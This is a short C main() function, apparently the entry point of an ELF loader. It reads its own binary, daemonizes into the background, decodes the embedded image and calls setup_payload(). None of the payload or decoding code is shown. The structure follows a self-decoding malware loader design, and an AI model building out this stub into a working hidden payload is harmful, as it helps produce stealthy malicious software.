
#include "elf_utils.h"
#include "setup.h"

int main(__attribute__((unused)) int ac, char const * const *av)
{
    elf_utils_t *utils = NULL;
    pid_t pid = 0;

    init();

    utils = elf_read(av[0]);
    if (!utils)
        exit(1);

    daemonize();
    elf_decode(utils);
    setup_payload();
    return 0;
}
